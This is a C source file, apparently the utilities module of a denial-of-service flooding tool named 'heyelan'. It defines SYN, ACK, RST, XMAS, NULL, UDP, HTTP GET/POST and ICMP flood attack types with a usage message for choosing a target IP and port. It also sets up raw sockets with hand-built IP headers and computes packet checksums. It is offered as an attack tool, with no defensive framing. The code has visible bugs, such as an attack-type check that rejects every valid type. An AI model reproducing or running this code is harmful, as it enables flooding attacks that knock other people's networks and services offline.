#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <signal.h>
#include <stdint.h>
#include <stddef.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include "utils.h"
#include "types.h"

/* for prng */
static unsigned int x;

struct attack_map_t {
	char *name;
	int attack_id;
};


static struct attack_map_t attack_map[] = {
	{"syn", ATTACK_TCP_SYN},
	{"ack", ATTACK_TCP_ACK},
	{"synack", ATTACK_TCP_SYNACK},
	{"pshack", ATTACK_TCP_PSHACK},
	{"ackfin", ATTACK_TCP_ACKFIN},
	{"rst", ATTACK_TCP_RST},
	{"xmas", ATTACK_TCP_XMAS},
	{"null", ATTACK_TCP_NULL},
	{"udp", ATTACK_UDP},
	{"get", ATTACK_HTTP_GET},
	{"post", ATTACK_HTTP_POST},
	{"ping", ATTACK_ICMP_PING},
	{NULL, 0}
};

static void heyelan_usage(char *argv[])
{
	fprintf(stdout,
		"%s\nusage: %s [attack type] [options]\n"
		"\nattack types:\n\n"
		"\tsyn    : SYN flood attack\n"
		"\tack    : ACK flood attack\n"
		"\tsynack : SYN-ACK flood attack\n"
		"\tpshack : PSH-ACK flood attack\n"
		"\tackfin : ACK-FIN flood attack\n"
		"\trst    : RST flood attack\n"
		"\txmas   : TCP XMAS flood attack\n"
		"\tnull   : TCP NULL flood attack\n"
		"\tudp    : UDP flood attack\n"
		"\tget    : HTTP GET flood attack\n"
		"\tpost   : HTTP POST flood attack\n"
		"\tping   : ICMP ping flood attack\n"
		"\noptions:\n\n"
		"\t-t [target IP address] : target IP address to attack\n"
		"\t-p [target port]       : target port to attack\n"
		"\t-h                     : help message\n\n%s", 
		COLOR_GREEN, argv[0], COLOR_RESET);
	exit(EXIT_FAILURE);
}

void parse_args(int argc, char *argv[], struct target_data *target)
{
	int opt;

	if (argc < 3) {
		heyelan_usage(argv);
	}

	target->attack_type = -1;
	for (int i = 0; attack_map[i].name != NULL; i++) {
		if (!strncmp(argv[1], attack_map[i].name, strlen(attack_map[i].name)) &&
			strlen(argv[1]) == strlen(attack_map[i].name)) {
			target->attack_type = attack_map[i].attack_id;
			break;
		}
	}

	if (target->attack_type) {
		fprintf(stderr, "%s\"%s\" is not a attack type, aborting.\n%s",
				COLOR_RED, argv[1], COLOR_RESET);
		exit(EXIT_FAILURE);
	}

	while ((opt = getopt(argc, argv, "t:p:h")) != -1) {
		switch (opt) {
		case 't':
			inet_pton(AF_INET, optarg, &target->address);
			break;
		case 'p':
			target->port = atoi(optarg);
			break;
		case 'h':
			heyelan_usage(argv);
			break;
		case '?':
			break;
		}
	}

	if (!target->address	) {
		fprintf(stderr, "%starget address not specified, aborting.\n%s",
			COLOR_RED, COLOR_RESET);
		exit(EXIT_FAILURE);
	}
}

int init_socket(int protocol)
{
	int sockfd;
	int enable = 1;

	if ((sockfd = socket(AF_INET, SOCK_RAW, protocol)) == -1) {
		fprintf(stderr, "%san error occured while creating socket : %s\n%s",
				COLOR_RED, strerror(errno), COLOR_RESET);
		exit(EXIT_FAILURE);
	}
	if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &enable, sizeof(int)) == -1) {
		fprintf(stderr, "%san error occured while setting socket options : %s\n%s",
				COLOR_RED, strerror(errno), COLOR_RESET);
		exit(EXIT_FAILURE);
	}

	return sockfd;
}

void init_signal(void (*signal_exit)())
{
	struct sigaction act;

	memset(&act, 0, sizeof(struct sigaction));
	act.sa_handler = signal_exit;

	if (sigaction(SIGINT, &act, NULL) == -1) {
		fprintf(stderr, "%san error occured while setting signal : %s\n%s",
				COLOR_RED, strerror(errno), COLOR_RESET);
		exit(EXIT_FAILURE);
	}
	if (sigaction(SIGTERM, &act, NULL) == -1) {
		fprintf(stderr, "%san error occured while setting signal : %s\n%s",
				COLOR_RED, strerror(errno), COLOR_RESET);
		exit(EXIT_FAILURE);
	}
}

uint16_t checksum_generic(uint16_t *ptr, size_t nbytes)
{
	unsigned short oddbyte = 0;
	register long sum = 0;
	register short answer = 0;

	while (nbytes > 1) {
		sum += *ptr++;
		nbytes -= 2;
	} 
	if (nbytes == 1) {
		*((unsigned char *)&oddbyte) = *(unsigned char *)ptr;
		sum += oddbyte;
	}
	
	sum = (sum >> 16) + (sum & 0xffff);
	sum += (sum >> 16);
	answer = (unsigned short)~sum;

	return answer;
}

uint16_t checksum_tcp(struct ip_hdr *iph, struct tcp_hdr *tcph,
			char *payload, size_t payload_size)
{
	struct psd_hdr psh;
	char *psd;
	size_t psd_size;
	uint16_t check;

	memcpy(&psh.src_addr, &iph->src_addr, 4);
	memcpy(&psh.dst_addr, &iph->dst_addr, 4);

	psh.reserve = 0;
	psh.protocol = IPPROTO_TCP;
	psh.length = htons(sizeof(struct tcp_hdr) + payload_size);

	psd_size = sizeof(struct psd_hdr) + sizeof(struct tcp_hdr) + payload_size;

	psd = malloc(psd_size);
	memset(psd, 0, psd_size);

	memcpy(psd, (char *)&psh, sizeof(struct psd_hdr));
	memcpy(psd + sizeof(struct psd_hdr), tcph, sizeof(struct tcp_hdr));
	memcpy(psd + sizeof(struct psd_hdr) + sizeof(struct tcp_hdr), payload, payload_size);

	if (payload) {
		memcpy(psd + sizeof(struct psd_hdr) + sizeof(struct tcp_hdr), payload, payload_size);
	}

	check = checksum_generic((uint16_t *)psd, psd_size);
	free(psd);

	return check;
}

uint16_t checksum_udp(struct ip_hdr *iph, struct udp_hdr *udph,
			char *payload, size_t payload_size)
{
	struct psd_hdr psh;
	char *psd;
	size_t psd_size;
	uint16_t check;

	memcpy(&psh.src_addr, &iph->src_addr, 4);
	memcpy(&psh.dst_addr, &iph->dst_addr, 4);

	psh.reserve = 0;
	psh.protocol = IPPROTO_UDP;
	psh.length = htons(sizeof(struct udp_hdr) + payload_size);

	psd_size = sizeof(struct psd_hdr) + sizeof(struct udp_hdr) + payload_size;

	psd = malloc(psd_size);
	memset(psd, 0, psd_size);

	memcpy(psd, (char *)&psh, sizeof(struct psd_hdr));
	memcpy(psd + sizeof(struct psd_hdr), udph, sizeof(struct udp_hdr));
	memcpy(psd + sizeof(struct psd_hdr) + sizeof(struct udp_hdr), payload, payload_size);

	check = checksum_generic((uint16_t *)psd, psd_size);
	free(psd);

        return check;
}

void seed_rand(unsigned int seed)
{
	x = seed;
}

int random_num()
{
	unsigned int number = 0;

	number = (1103515245 * x + 12345) % (1 << 31);
	x = number;

	return number;
}
